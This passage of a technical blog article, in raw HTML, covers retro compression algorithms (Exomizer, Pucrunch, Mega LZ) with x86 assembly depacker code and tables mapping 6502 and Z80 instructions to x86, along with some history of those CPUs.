style=\"color: #A90D91;\">ecx</span>,<span style=\"color: #A90D91;\">ecx</span>\n    <span style=\"color: #000000;\">call</span>    <span style=\"color: #000000;\">.get_dibits</span>     <span style=\"color: #177500;\">; read 2 offset bits</span>\n    <span style=\"color: #000000;\">adc</span>     <span style=\"color: #A90D91;\">ecx</span>,<span style=\"color: #A90D91;\">ecx</span>\n    <span style=\"color: #000000;\">xchg</span>    <span style=\"color: #A90D91;\">eax</span>,<span style=\"color: #A90D91;\">ecx</span>         <span style=\"color: #177500;\">; preserve bit queue in cx, put offset in ax</span>\n    <span style=\"color: #000000;\">jz</span>      <span style=\"color: #000000;\">.write_zero</span>     <span style=\"color: #177500;\">; if offset is 0, write a zero byte</span>\n                            <span style=\"color: #177500;\">; short offset 1-15</span>\n    <span style=\"color: #000000;\">mov</span>     <span style=\"color: #A90D91;\">ebx</span>,<span style=\"color: #A90D91;\">edi</span>         <span style=\"color: #177500;\">; point to destination in es:di - offset in ax</span>\n    <span style=\"color: #000000;\">sub</span>     <span style=\"color: #A90D91;\">ebx</span>,<span style=\"color: #A90D91;\">eax</span>         <span style=\"color: #177500;\">; we trash bx, it will be reset to 3 when we loop</span>\n    <span style=\"color: #000000;\">mov</span>     <span style=\"color: #A90D91;\">al</span>,[<span style=\"color: #A90D91;\">ebx</span>]        <span style=\"color: #177500;\">; read byte from short offset</span>\n<span style=\"color: #000000;\">.write_zero:</span>\n    <span style=\"color: #000000;\">stosb</span>                   <span style=\"color: #177500;\">; copy matched byte</span>\n    <span style=\"color: #000000;\">xchg</span>    <span style=\"color: #A90D91;\">eax</span>,<span style=\"color: #A90D91;\">ecx</span>         <span style=\"color: #177500;\">; restore bit queue in al</span>\n    <span style=\"color: #000000;\">jmp</span>     <span style=\"color: #000000;\">.next_command_after_literal</span>\n<span style=\"color: #000000;\">.done:</span>\n    <span style=\"color: #000000;\">sub</span>     <span style=\"color: #A90D91;\">edi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">8</span>] <span style=\"color: #177500;\">; compute decompressed size</span>\n    <span style=\"color: #000000;\">mov</span>     [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">28</span>], <span style=\"color: #A90D91;\">edi</span>\n    <span style=\"color: #000000;\">popad</span>\n    <span style=\"color: #000000;\">ret</span>\n</pre>\n</div>\n<h2 id=\"6502\">9. MOS Technology 6502</h2>\n<p><a href=\"http://www.6502.org/\">This 8-Bit CPU</a> was the product of Motorola management, ignoring customer concerns about the cost of the <a href=\"http://www.cpushack.com/2016/08/19/cpu-of-the-day-motorola-mc6801-the-second-first-6800-mcu/\">6800</a> CPU launched by the company in 1974. Following consultations with potential customers for the 6800. <a href=\"https://www.team6502.org/chuck-peddle.html\">Chuck Peddle</a> tried to convince Motorola to develop a low-cost alternative for consumers on a limited budget.</p>\n<p>Motorola ordered Peddle to cease working on this idea, which resulted in his departure from the company with several other employees that began working on the 6502 at <a href=\"https://www.commodore.ca/commodore-history/the-rise-of-mos-technology-the-6502/\">MOS Technology</a>. Used in the <a href=\"http://oldcomputers.net/c64-info.html\">Commodore 64</a>, the <a href=\"http://oldcomputers.net/appleii.html\">Apple II</a>, and the <a href=\"http://oldcomputers.net/bbc-micro.html\">BBC Micro</a> home computers, including various gaming consoles, Motorola acknowledged missing a golden opportunity. The company would later express regret for dismissing Peddle&#8217;s idea since the <a href=\"http://www.cpu-world.com/CPUs/650x/index.html\">6502</a> was far more successful than the 6800.</p>\n<p>Trivia: <a href=\"https://www.imdb.com/title/tt0088247/\">The Terminator</a> movie from 1984 uses CPU instructions <a href=\"https://www.pagetable.com/?p=64\">from the 6502</a>. <img alt=\"\ud83d\ude42\" class=\"wp-smiley\" src=\"https://s0.wp.com/wp-content/mu-plugins/wpcom-smileys/twemoji/2/72x72/1f642.png\" style=\"height: 1em;\" /></p>\n<p>Those of you that want to program a Commodore 64 without purchasing one can always use an emulator like <a href=\"https://vice-emu.sourceforge.io/\">VICE</a>. For the Apple II, there&#8217;s <a href=\"https://github.com/applewin/applewin\">AppleWin</a>. (Yes, Windows only). Since <a href=\"https://twitter.com/a2_qkumba\">Qkumba</a> already implemented several <a href=\"http://pferrie.epizy.com/misc/appleii.htm\">popular depackers</a> for 6502, I requested a translation of the <a href=\"https://bitbucket.org/magli143/exomizer/wiki/Home\">Exomizer</a> compression algorithm. Using this translation, I created the following table, which lists 6502 instructions and their equivalent for x86.  The EBX and ECX registers replace the X and Y registers, respectively. Using #$80 as an immediate value is simply for demonstration, and you&#8217;ll find a full <a href=\"http://www.6502.org/tutorials/6502opcodes.html\">list of instructions here</a>.</p>\n<table id=\"t01\">\n<tr>\n<th>6502</th>\n<th>x86</th>\n<th>Description</th>\n</tr>\n<tr>\n<td>lda #$80</td>\n<td>mov al, 0x80</td>\n<td>Load byte into accumulator.</td>\n</tr>\n<tr>\n<td>sta [address]</td>\n<td>mov [address], al</td>\n<td>Store accumulator in memory.</td>\n</tr>\n<tr>\n<td>cmp #$80</td>\n<td>cmp al, 0x80</td>\n<td>Compare byte with accumulator.</td>\n</tr>\n<tr>\n<td>cpx #$80</td>\n<td>cmp bl, 0x80</td>\n<td>Compare byte with X.</td>\n</tr>\n<tr>\n<td>cpy #$80</td>\n<td>cmp cl, 0x80</td>\n<td>Compare byte with Y.</td>\n</tr>\n<tr>\n<td>asl</td>\n<td>shl al, 1</td>\n<td>ASL shifts all bits left one position. 0 is shifted into bit 0 and the original bit 7 is shifted into the Carry.</td>\n</tr>\n<tr>\n<td>lsr</td>\n<td>shr al, 1</td>\n<td>Logical shift right.</td>\n</tr>\n<tr>\n<td>bit #$7</td>\n<td>test al, 7</td>\n<td>Perform a bitwise AND, set the flags and discard the result.</td>\n</tr>\n<tr>\n<td>sec</td>\n<td>stc</td>\n<td>SEt the Carry flag.</td>\n</tr>\n<tr>\n<td>adc #$80</td>\n<td>adc al, 0x80</td>\n<td>Add byte with Carry.</td>\n</tr>\n<tr>\n<td>sbc #$1</td>\n<td>sbb al, 1</td>\n<td>Subtract byte with Carry.</td>\n</tr>\n<tr>\n<td>rts</td>\n<td>ret</td>\n<td>Return from subroutine.</td>\n</tr>\n<tr>\n<td>jsr</td>\n<td>call</td>\n<td>Save next address and jump to subroutine.</td>\n</tr>\n<tr>\n<td>eor #$80</td>\n<td>xor al, 0x80</td>\n<td>Perform an exclusive OR.</td>\n</tr>\n<tr>\n<td>ora #$80</td>\n<td>or al, 0x80</td>\n<td>Perform a bitwise OR.</td>\n</tr>\n<tr>\n<td>and #$80</td>\n<td>and al, 0x80</td>\n<td>Bitwise AND with accumulator</td>\n</tr>\n<tr>\n<td>rol</td>\n<td>rcl al, 1</td>\n<td>Shifts all bits left one position. The Carry is shifted into bit 0 and the original bit 7 is shifted into the Carry.</td>\n</tr>\n<tr>\n<td>ror</td>\n<td>rcr al, 1</td>\n<td>Shifts all bits right one position. The Carry is shifted into bit 7 and the original bit 0 is shifted into the Carry.</td>\n</tr>\n<tr>\n<td>bpl</td>\n<td>jns</td>\n<td>Branch on PLus. Jump if Not Signed.</td>\n</tr>\n<tr>\n<td>bmi</td>\n<td>js</td>\n<td>Branch on MInus. Jump if Signed.</td>\n</tr>\n<tr>\n<td>bcc:bcs</td>\n<td>jnc:jc</td>\n<td>Branch on Carry Clear. Branch on Carry Set.</td>\n</tr>\n<tr>\n<td>bne:beq</td>\n<td>jne:je</td>\n<td>Branch on Not Equal. Branch on EQual.</td>\n</tr>\n<tr>\n<td>bvc:bvs</td>\n<td>jno:jo</td>\n<td>Branch on oVerflow Clear. Branch on oVerflow Set.</td>\n</tr>\n<tr>\n<td>php</td>\n<td>pushf</td>\n<td>PusH Processor status.</td>\n</tr>\n<tr>\n<td>plp</td>\n<td>popf</td>\n<td>PuLl Processor status.</td>\n</tr>\n<tr>\n<td>pha</td>\n<td>push eax</td>\n<td>PusH Accumulator.</td>\n</tr>\n<tr>\n<td>pla</td>\n<td>pop  eax</td>\n<td>PuLl Accumulator.</td>\n</tr>\n<tr>\n<td>tax</td>\n<td>movzx ebx, al / mov bl, al</td>\n<td>Transfer A to X.</td>\n</tr>\n<tr>\n<td>tay</td>\n<td>movzx ecx, al / mov cl, al</td>\n<td>Transfer A to Y.</td>\n</tr>\n<tr>\n<td>txa</td>\n<td>mov al, bl</td>\n<td>Transfer X to A.</td>\n</tr>\n<tr>\n<td>tya</td>\n<td>mov al, cl</td>\n<td>Transfer Y to A.</td>\n</tr>\n<tr>\n<td>inx</td>\n<td>inc ebx / inc bl</td>\n<td>INcrement X.</td>\n</tr>\n<tr>\n<td>iny</td>\n<td>inc ecx / inc cl</td>\n<td>INcrement Y.</td>\n</tr>\n<tr>\n<td>dex</td>\n<td>dec ebx / dec bl</td>\n<td>DEcrement X.</td>\n</tr>\n<tr>\n<td>dey</td>\n<td>dec ecx / dec cl</td>\n<td>DEcrement Y.</td>\n</tr>\n</table>\n<h2 id=\"exo\">9.1 Exomizer</h2>\n<p>Designed by Magnus Lind and published in 2002. <a href=\"https://bitbucket.org/magli143/exomizer/wiki/Home\">Exomizer</a> is popular for devices such as the <a href=\"https://www.old-computers.com/museum/computer.asp?c=252\">Commodore VIC20</a>, the <a href=\"https://www.old-computers.com/museum/computer.asp?c=98\">C64</a>, the <a href=\"https://www.old-computers.com/museum/forum.asp?c=97&amp;st=1\">C16/plus4</a>, the <a href=\"https://www.old-computers.com/museum/computer.asp?st=1&amp;c=96\">C128</a>, the <a href=\"https://www.old-computers.com/museum/computer.asp?st=1&amp;c=103\">PET 4032</a>, the <a href=\"http://oldcomputers.net/atari800.html\">Atari 400/800 XL/XE</a>, the <a href=\"http://oldcomputers.net/appleii.html\">Apple II+e</a>, the <a href=\"https://www.old-computers.com/museum/computer.asp?c=180\">Oric-1</a>, the <a href=\"https://www.old-computers.com/museum/computer.asp?c=79\">Oric Atmos</a>, and the <a href=\"http://oldcomputers.net/bbc-micro.html\">BBC Micro B</a>. It inspired the development of other executable compressors, most notably <a href=\"https://modexp.wordpress.com/feed/#packfire\">PackFire</a>. <a href=\"http://pferrie.epizy.com/?i=1\">Qkumba</a> was kind enough to provide a translation of the Exomizer 3 decoder translated from 6502 to x86. However, due to the complexity of the source code, only a snippet of code is shown here. The Y register maps to the EDI register while the X register maps to the ESI register.</p>\n<div class=\"highlight\" style=\"background: #ffffff;\">\n<pre style=\"line-height: 125%;\"><span></span><span style=\"color: #633820;\">%MACRO mac_get_bits 0</span>\n        <span style=\"color: #000000;\">call</span> <span style=\"color: #000000;\">get_bits</span>                   <span style=\"color: #177500;\">;jsr get_bits</span>\n<span style=\"color: #633820;\">%ENDM</span>\n<span style=\"color: #000000;\">get_bits:</span>\n        <span style=\"color: #000000;\">adc</span>  <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #1C01CE;\">0x80</span>                   <span style=\"color: #177500;\">;adc #$80                ; needs c=0, affects v</span>\n        <span style=\"color: #000000;\">pushfd</span>\n        <span style=\"color: #000000;\">shl</span>  <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #1C01CE;\">1</span>                      <span style=\"color: #177500;\">;asl</span>\n        <span style=\"color: #000000;\">lahf</span>\n        <span style=\"color: #000000;\">jns</span>  <span style=\"color: #000000;\">gb_skip</span>                    <span style=\"color: #177500;\">;bpl gb_skip</span>\n<span style=\"color: #000000;\">gb_next:</span>\n        <span style=\"color: #000000;\">shl</span>  <span style=\"color: #A90D91;\">byte</span> [<span style=\"color: #000000;\">zp_bitbuf</span>], <span style=\"color: #1C01CE;\">1</span>        <span style=\"color: #177500;\">;asl zp_bitbuf</span>\n        <span style=\"color: #000000;\">jne</span>  <span style=\"color: #000000;\">gb_ok</span>                      <span style=\"color: #177500;\">;bne gb_ok</span>\n        <span style=\"color: #000000;\">mac_refill_bits</span>                 <span style=\"color: #177500;\">;+mac_refill_bits</span>\n<span style=\"color: #000000;\">gb_ok:</span>\n        <span style=\"color: #000000;\">rcl</span>  <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #1C01CE;\">1</span>                      <span style=\"color: #177500;\">;rol</span>\n        <span style=\"color: #000000;\">lahf</span>\n        <span style=\"color: #000000;\">test</span> <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #A90D91;\">al</span>\n        <span style=\"color: #000000;\">js</span>   <span style=\"color: #000000;\">gb_next</span>                    <span style=\"color: #177500;\">;bmi gb_next</span>\n<span style=\"color: #000000;\">gb_skip:</span>\n        <span style=\"color: #000000;\">popfd</span>\n        <span style=\"color: #000000;\">sahf</span>\n        <span style=\"color: #000000;\">jo</span>   <span style=\"color: #000000;\">gb_get_hi</span>                  <span style=\"color: #177500;\">;bvs gb_get_hi</span>\n        <span style=\"color: #000000;\">ret</span>                             <span style=\"color: #177500;\">;rts</span>\n<span style=\"color: #000000;\">gb_get_hi:</span>\n        <span style=\"color: #000000;\">stc</span>                             <span style=\"color: #177500;\">;sec</span>\n        <span style=\"color: #000000;\">mov</span>  [<span style=\"color: #000000;\">zp_bits_hi</span>], <span style=\"color: #A90D91;\">al</span>           <span style=\"color: #177500;\">;sta zp_bits_hi</span>\n        <span style=\"color: #000000;\">jmp</span>  <span style=\"color: #000000;\">get_crunched_byte</span>          <span style=\"color: #177500;\">;jmp get_crunched_byte</span>\n<span style=\"color: #633820;\">%ENDIF</span>\n<span style=\"color: #177500;\">; -------------------------------------------------------------------</span>\n<span style=\"color: #177500;\">; calculate tables (62 bytes) + get_bits macro</span>\n<span style=\"color: #177500;\">; x and y must be #0 when entering</span>\n<span style=\"color: #177500;\">;</span>\n        <span style=\"color: #000000;\">clc</span>                             <span style=\"color: #177500;\">;clc</span>\n<span style=\"color: #000000;\">table_gen:</span>\n        <span style=\"color: #000000;\">movzx</span> <span style=\"color: #A90D91;\">esi</span>, <span style=\"color: #A90D91;\">al</span>                   <span style=\"color: #177500;\">;tax</span>\n        <span style=\"color: #000000;\">mov</span>   <span style=\"color: #A90D91;\">eax</span>, <span style=\"color: #A90D91;\">edi</span>                  <span style=\"color: #177500;\">;tya</span>\n        <span style=\"color: #000000;\">and</span>   <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #1C01CE;\">0x0f</span>                  <span style=\"color: #177500;\">;and #$0f</span>\n        <span style=\"color: #000000;\">mov</span>   [<span style=\"color: #A90D91;\">edi</span> <span style=\"color: #000000;\">+</span> <span style=\"color: #000000;\">tabl_lo</span>], <span style=\"color: #A90D91;\">al</span>       <span style=\"color: #177500;\">;sta tabl_lo,y</span>\n        <span style=\"color: #000000;\">je</span>    <span style=\"color: #000000;\">shortcut</span>                  <span style=\"color: #177500;\">;beq shortcut            ; start a new sequence</span>\n<span style=\"color: #177500;\">; -------------------------------------------------------------------</span>\n        <span style=\"color: #000000;\">mov</span>   <span style=\"color: #A90D91;\">eax</span>, <span style=\"color: #A90D91;\">esi</span>                  <span style=\"color: #177500;\">;txa</span>\n        <span style=\"color: #000000;\">adc</span>   <span style=\"color: #A90D91;\">al</span>, [<span style=\"color: #A90D91;\">edi</span> <span style=\"color: #000000;\">+</span> <span style=\"color: #000000;\">tabl_lo</span> <span style=\"color: #000000;\">-</span> <span style=\"color: #1C01CE;\">1</span>]   <span style=\"color: #177500;\">;adc tabl_lo - 1,y</span>\n        <span style=\"color: #000000;\">mov</span>   [<span style=\"color: #A90D91;\">edi</span> <span style=\"color: #000000;\">+</span> <span style=\"color: #000000;\">tabl_lo</span>], <span style=\"color: #A90D91;\">al</span>       <span style=\"color: #177500;\">;sta tabl_lo,y</span>\n        <span style=\"color: #000000;\">mov</span>   <span style=\"color: #A90D91;\">al</span>, [<span style=\"color: #000000;\">zp_len_hi</span>]           <span style=\"color: #177500;\">;lda zp_len_hi</span>\n        <span style=\"color: #000000;\">adc</span>   <span style=\"color: #A90D91;\">al</span>, [<span style=\"color: #A90D91;\">edi</span> <span style=\"color: #000000;\">+</span> <span style=\"color: #000000;\">tabl_hi</span> <span style=\"color: #000000;\">-</span> <span style=\"color: #1C01CE;\">1</span>]   <span style=\"color: #177500;\">;adc tabl_hi - 1,y</span>\n<span style=\"color: #000000;\">shortcut:</span>\n        <span style=\"color: #000000;\">mov</span>   [<span style=\"color: #A90D91;\">edi</span> <span style=\"color: #000000;\">+</span> <span style=\"color: #000000;\">tabl_hi</span>], <span style=\"color: #A90D91;\">al</span>       <span style=\"color: #177500;\">;sta tabl_hi,y</span>\n<span style=\"color: #177500;\">; -------------------------------------------------------------------</span>\n        <span style=\"color: #000000;\">mov</span>   <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #1C01CE;\">0x01</span>                  <span style=\"color: #177500;\">;lda #$01</span>\n        <span style=\"color: #000000;\">mov</span>   [<span style=\"color: #000000;\">zp_len_hi</span>], <span style=\"color: #A90D91;\">al</span>           <span style=\"color: #177500;\">;sta &lt;zp_len_hi</span>\n        <span style=\"color: #000000;\">mov</span>   <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #1C01CE;\">0x78</span>                  <span style=\"color: #177500;\">;lda #$78                ; %01111000</span>\n        <span style=\"color: #000000;\">mac_get_bits</span>                    <span style=\"color: #177500;\">;+mac_get_bits</span>\n<span style=\"color: #177500;\">; -------------------------------------------------------------------</span>\n        <span style=\"color: #000000;\">shr</span>   <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #1C01CE;\">1</span>                     <span style=\"color: #177500;\">;lsr</span>\n        <span style=\"color: #000000;\">movzx</span> <span style=\"color: #A90D91;\">esi</span>, <span style=\"color: #A90D91;\">al</span>                   <span style=\"color: #177500;\">;tax</span>\n        <span style=\"color: #000000;\">je</span>    <span style=\"color: #000000;\">rolled</span>                    <span style=\"color: #177500;\">;beq rolled</span>\n        <span style=\"color: #000000;\">pushfd</span>                          <span style=\"color: #177500;\">;php</span>\n<span style=\"color: #000000;\">rolle:</span>\n        <span style=\"color: #000000;\">shl</span>  <span style=\"color: #A90D91;\">byte</span> [<span style=\"color: #000000;\">zp_len_hi</span>],<span style=\"color: #1C01CE;\">1</span>         <span style=\"color: #177500;\">;asl zp_len_hi</span>\n        <span style=\"color: #000000;\">stc</span>                             <span style=\"color: #177500;\">;sec</span>\n        <span style=\"color: #000000;\">rcr</span>  <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #1C01CE;\">1</span>                      <span style=\"color: #177500;\">;ror</span>\n        <span style=\"color: #000000;\">dec</span>  <span style=\"color: #A90D91;\">esi</span>                        <span style=\"color: #177500;\">;dex</span>\n        <span style=\"color: #000000;\">jne</span>  <span style=\"color: #000000;\">rolle</span>                      <span style=\"color: #177500;\">;bne rolle</span>\n        <span style=\"color: #000000;\">popfd</span>                           <span style=\"color: #177500;\">;plp</span>\n<span style=\"color: #000000;\">rolled:</span>\n        <span style=\"color: #000000;\">rcr</span>  <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #1C01CE;\">1</span>                      <span style=\"color: #177500;\">;ror</span>\n        <span style=\"color: #000000;\">mov</span>  [<span style=\"color: #A90D91;\">edi</span> <span style=\"color: #000000;\">+</span> <span style=\"color: #000000;\">tabl_bi</span>], <span style=\"color: #A90D91;\">al</span>        <span style=\"color: #177500;\">;sta tabl_bi,y</span>\n        <span style=\"color: #000000;\">test</span> <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #A90D91;\">al</span>\n        <span style=\"color: #000000;\">js</span>   <span style=\"color: #000000;\">no_fixup_lohi</span>              <span style=\"color: #177500;\">;bmi no_fixup_lohi</span>\n        <span style=\"color: #000000;\">mov</span>  <span style=\"color: #A90D91;\">al</span>, [<span style=\"color: #000000;\">zp_len_hi</span>]            <span style=\"color: #177500;\">;lda zp_len_hi</span>\n        <span style=\"color: #000000;\">mov</span>  <span style=\"color: #A90D91;\">ebx</span>, <span style=\"color: #A90D91;\">esi</span>\n        <span style=\"color: #000000;\">mov</span>  [<span style=\"color: #000000;\">zp_len_hi</span>], <span style=\"color: #A90D91;\">bl</span>            <span style=\"color: #177500;\">;stx zp_len_hi</span>\n        <span style=\"color: #000000;\">jmp</span>  <span style=\"color: #000000;\">skip_fix</span>                   <span style=\"color: #177500;\">;!BYTE $24</span>\n<span style=\"color: #000000;\">no_fixup_lohi:</span>\n        <span style=\"color: #000000;\">mov</span>  <span style=\"color: #A90D91;\">eax</span>, <span style=\"color: #A90D91;\">esi</span>                   <span style=\"color: #177500;\">;txa</span>\n<span style=\"color: #177500;\">; -------------------------------------------------------------------</span>\n<span style=\"color: #000000;\">skip_fix:</span>\n        <span style=\"color: #000000;\">inc</span>  <span style=\"color: #A90D91;\">edi</span>                        <span style=\"color: #177500;\">;iny</span>\n        <span style=\"color: #000000;\">cmp</span>  <span style=\"color: #A90D91;\">edi</span>, <span style=\"color: #000000;\">encoded_entries</span>       <span style=\"color: #177500;\">;cpy #encoded_entries</span>\n        <span style=\"color: #000000;\">jne</span>  <span style=\"color: #000000;\">table_gen</span>                  <span style=\"color: #177500;\">;bne table_gen</span>\n</pre>\n</div>\n<h2 id=\"pucrunch\">9.2 Pucrunch</h2>\n<p>Designed by <a href=\"http://a1bert.kapsi.fi/\">Pasi Ojala</a> and published in 1997. It\u2019s <a href=\"http://a1bert.kapsi.fi/Dev/pucrunch/\">described by the author</a> as a Hybrid LZ77 and RLE compressor, using Elias gamma coding for reference length, and a mixture of gamma and linear code for the offset. It requires no additional memory for decompression. The description and source code are well worth a read for those of you that want to understand the characteristics of other LZ77-style compressors.</p>\n<h2 id=\"z80\">10. Zilog 80</h2>\n<p><em>I was able to design whatever I wanted.  And personally I wanted to develop the best and the most wonderful 8-Bit microprocessor in the world.</em> \u2014 <a href=\"https://computerhistory.org/profile/masatoshi-shima/\">Masatoshi Shima</a></p>\n<p>After helping to design microprocessors at Intel (4-Bit 4004, the 8-Bit 8008 and 8080), <a href=\"https://www.ithistory.org/honor-roll/mr-ralph-ungermann\">Ralph Ungermann</a> and <a href=\"https://computerhistory.org/profile/federico-faggin/\">Federico Faggin</a> left Intel in 1974 to form Zilog. Masatoshi Shima, who also worked at Intel, would later join the company in 1975 to work on an 8-Bit CPU released in 1976 they called the <a href=\"http://www.z80.info/\">Z80</a>. The Z80 is essentially a clone of the Intel 8080 with support for more instructions, more registers, and 16-Bit capabilities. Many of the Z80 instructions, to the best of my knowledge, do not have an equivalent on the x86. Proceed with caution, as with no prior experience writing for the Z80, some of the mappings presented here may be incorrect.</p>\n<table id=\"t01\">\n<tr>\n<th>Z80</th>\n<th>x86</th>\n<th>Z80 Description</th>\n</tr>\n<tr>\n<td>bit</td>\n<td>test</td>\n<td>Perform a bitwise AND, set state flags and discard result.</td>\n</tr>\n<tr>\n<td>ccf</td>\n<td>cmc</td>\n<td>Inverts/Complements the carry flag.</td>\n</tr>\n<tr>\n<td>cp</td>\n<td>cmp</td>\n<td>Performs subtraction from A. Sets flags and discards result.</td>\n</tr>\n<tr>\n<td>djnz</td>\n<td>loop</td>\n<td>Decreases B and jumps to a label if Not Zero. If mapping BC to CX, LOOP works or REP depending on operation.</td>\n</tr>\n<tr>\n<td>ex</td>\n<td>xchg</td>\n<td>Exchanges two 16-bit values.</td>\n</tr>\n<tr>\n<td>exx</td>\n<td></td>\n<td>EXX exchanges BC, DE, and HL with shadow registers with BC&#8217;, DE&#8217;, and HL&#8217;. Unfortunately, nothing like this available for x86. Try to use spare registers or rewrite algorithm to avoid using EXX.</td>\n</tr>\n<tr>\n<td>jp</td>\n<td>jcc</td>\n<td>Conditional or unconditional jump to absolute address.</td>\n</tr>\n<tr>\n<td>jr</td>\n<td>jcc</td>\n<td>Conditional or unconditional jump to relative address not exceeding 128-bytes ahead or behind.</td>\n</tr>\n<tr>\n<td>ld</td>\n<td>mov</td>\n<td>Load/Copy immediate value or register to another register.</td>\n</tr>\n<tr>\n<td>ldi</td>\n<td>movsb</td>\n<td>Performs a &#8220;LD (DE),(HL)&#8221;, then increments DE and HL. Map SI to HL, DI to DE and you can perform the same operation quite easily on x86.</td>\n</tr>\n<tr>\n<td>ldir</td>\n<td>rep movsb</td>\n<td>Repeats LDI (LD (DE),(HL), then increments DE, HL, and decrements BC) until BC=0. Note that if BC=0 before this instruction is called, it will loop around until BC=0 again.</td>\n</tr>\n<tr>\n<td>res</td>\n<td>btr</td>\n<td>Reset bit. BTR doesn&#8217;t behave exactly the same, but it&#8217;s close enough. An alternative might be masking with AND.</td>\n</tr>\n<tr>\n<td>rl / rla / rlc / rlca</td>\n<td>rcl or adc</td>\n<td>The register is shifted left and the carry flag is put into bit zero of the register. The 7th bit is put into the carry flag. You can perform the same operation using ADC (Add with Carry).</td>\n</tr>\n<tr>\n<td>rld</td>\n<td></td>\n<td>Performs a 4-bit leftward rotation of the 12-bit number whose 4 most signigifcant bits are the 4 least significant bits of A, and its 8 least significant bits are in (HL).</td>\n</tr>\n<tr>\n<td>rr / rra / r</td>\n<td>rcr</td>\n<td>9-bit rotation to the right. The carry is copied into bit 7, and the bit leaving on the right is copied into the carry.</td>\n</tr>\n<tr>\n<td>rra</td>\n<td></td>\n<td>Performs a RR A faster, and modifies the flags differently.</td>\n</tr>\n<tr>\n<td>sbc</td>\n<td>sbb</td>\n<td>Sum of second operand and carry flag is subtracted from the first operand. Results are written into the first operand.</td>\n</tr>\n<tr>\n<td>sla</td>\n<td>sal</td>\n<td></td>\n</tr>\n<tr>\n<td>sll/sl1</td>\n<td>shl</td>\n<td>An &#8220;undocumented&#8221; instruction. Functions like sla, except a 1 is inserted into the low bit.</td>\n</tr>\n<tr>\n<td>sra</td>\n<td>sar</td>\n<td>Arithmetic shift right 1 bit, bit 0 goes to carry flag, bit 7 remains unchanged.</td>\n</tr>\n<tr>\n<td>srl</td>\n<td>shr</td>\n<td>Like SRA, except a 0 is put into bit 7. The bits are all shifted right, with bit 0 put into the carry flag.</td>\n</tr>\n</table>\n<h2 id=\"mlz\">10.1 Mega LZ</h2>\n<p>Designed by the demo group <a href=\"http://www.pouet.net/groups.php?which=2223\">MAYhEM</a> and <a href=\"http://os4depot.net/index.php?function=showfile&amp;file=development/cross/megalz.lha\">published in 2005</a>. The original Z80 decoder by <a href=\"http://www.pouet.net/user.php?who=4414\">fyrex</a> was optimized by <a href=\"https://github.com/specke\">Introspec</a> in 2017 while researching <a href=\"http://hype.retroscene.org/blog/dev/740.html\">8-Bit compression algorithms</a>. The x86 assembly based on that uses the following register mapping.</p>\n<table id=\"t03\">\n<tr>\n<th colspan=\"2\">Register Mapping</th>\n</tr>\n<tr>\n<td>Z80</td>\n<td>x86</td>\n</tr>\n<tr>\n<td>A</td>\n<td>AL</td>\n</tr>\n<tr>\n<td>B</td>\n<td>EBX</td>\n</tr>\n<tr>\n<td>C</td>\n<td>ECX</td>\n</tr>\n<tr>\n<td>D</td>\n<td>DH</td>\n</tr>\n<tr>\n<td>E</td>\n<td>DL</td>\n</tr>\n<tr>\n<td>HL</td>\n<td>ESI</td>\n</tr>\n<tr>\n<td>DE</td>\n<td>EDI</td>\n</tr>\n</table>\n<p>The EBX and ECX registers are to replace the B and C registers, respectively, to save a few bytes required for incrementing and decrementing 8-bit registers on x86.</p>\n<div class=\"highlight\" style=\"background: #ffffff;\">\n<pre style=\"line-height: 125%;\"><span></span><span style=\"color: #000000;\">megalz_depack:</span>\n<span style=\"color: #000000;\">_megalz_depack:</span>\n    <span style=\"color: #000000;\">pushad</span>\n    \n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">esi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">12</span>]  <span style=\"color: #177500;\">; esi = inbuf</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">edi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span> <span style=\"color: #1C01CE;\">4</span>]  <span style=\"color: #177500;\">; edi = outbuf</span>\n    \n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #000000;\">init_get_bit</span>\n    \n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #A90D91;\">al</span>            <span style=\"color: #177500;\">; add a, a</span>\n    <span style=\"color: #000000;\">jnz</span>    <span style=\"color: #000000;\">exit_get_bit</span>      <span style=\"color: #177500;\">; ret nz</span>\n    <span style=\"color: #000000;\">lodsb</span>                    <span style=\"color: #177500;\">; ld a, (hl)</span>\n                             <span style=\"color: #177500;\">; inc hl</span>\n    <span style=\"color: #000000;\">adc</span>    <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #A90D91;\">al</span>            <span style=\"color: #177500;\">; rla</span>\n<span style=\"color: #000000;\">exit_get_bit:</span>\n    <span style=\"color: #000000;\">ret</span>                      <span style=\"color: #177500;\">; ret</span>\n<span style=\"color: #000000;\">init_get_bit:</span>\n    <span style=\"color: #000000;\">pop</span>    <span style=\"color: #A90D91;\">ebp</span>               <span style=\"color: #177500;\">;</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #1C01CE;\">128</span>           <span style=\"color: #177500;\">; ld a, 128</span>\n<span style=\"color: #000000;\">mlz_literal:</span>\n    <span style=\"color: #000000;\">movsb</span>                    <span style=\"color: #177500;\">; ldi</span>\n<span style=\"color: #000000;\">mlz_main:</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #A90D91;\">ebp</span>               <span style=\"color: #177500;\">; GET_BIT</span>\n    <span style=\"color: #000000;\">jc</span>     <span style=\"color: 